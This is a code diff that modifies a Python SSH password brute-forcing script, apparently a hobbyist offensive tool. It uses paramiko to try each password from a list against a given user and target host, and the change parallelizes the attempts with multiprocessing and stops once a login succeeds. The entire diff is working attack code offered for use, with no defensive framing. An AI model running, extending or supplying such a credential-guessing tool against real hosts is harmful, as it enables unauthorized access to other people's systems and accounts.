@@ -18,16 +18,23 @@ def get_arguments():
         parser.error("[-] Please specify a username, use --help for more info")
     return options 
 
-def ssh_attack(user,address,password, event):
-
+def ssh_attack(user,address,password,event, array,q):
     if not event.is_set():
+        print('Testing password: ' + password)
         try :
-            print('Testing password: ' + password)
             ssh.connect(address, username=user, password=password)
+            array=password
+            print(password)
             event.set()
-            #return password
+            return True
+
         except paramiko.ssh_exception.AuthenticationException:
-                print("authentication failed")
+            print("authentication failed")
+            return False
+
+def init(vv):
+    global v
+    v = vv
 
 if __name__ == '__main__':
     options = get_arguments()
@@ -42,25 +49,34 @@ if __name__ == '__main__':
     #creating the ssh connection object
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-##################################################3
-#    for password in pass_list:
-#        ssh_attack(options.user, options.target, password)
-#########################################################
-    pool = mp.Pool(processes=2)
+
+    #Preparing the multiprocessing
+    #Preparing the pool
+    #pool = mp.Pool(processes=4)
+
+    # Preparing the array to return the password value
+    q = mp.Queue()
+    array = mp.Array('c', 15)
+    pool = mp.Pool(initializer=init, initargs = (array,), processes=4)
     manager = mp.Manager()
     event = manager.Event()
+
     t1 = time.time()
-    '''for synchronous'''
-#    [pool.apply(ssh, args=(x,)) for x in pass_list]
 
     '''For Asynchronous'''
-    #results = [pool.apply_async(ssh_attack, args=(options.user, options.target, x)) for x in pass_list]
-    #results = [pool.apply_async(ssh_attack, args=(options.user, options.target, x, event)) for x in pass_list]
-    #output = [p.get() for p in results]
-    #print(output)
+    #for x in pass_list:
+    #    re = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event, array))
+    #print(re.get())
+
+##############################3
 
     for password in pass_list:
-        pool.apply_async(ssh_attack, args=(options.user, options.target, password, event)) 
+        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
+        p.start()
+        #print(q.get())
+        #p.join()
+    print(array[:])
+#########################33
     print('Code executed in: ', time.time() - t1)
     
     ####################################################
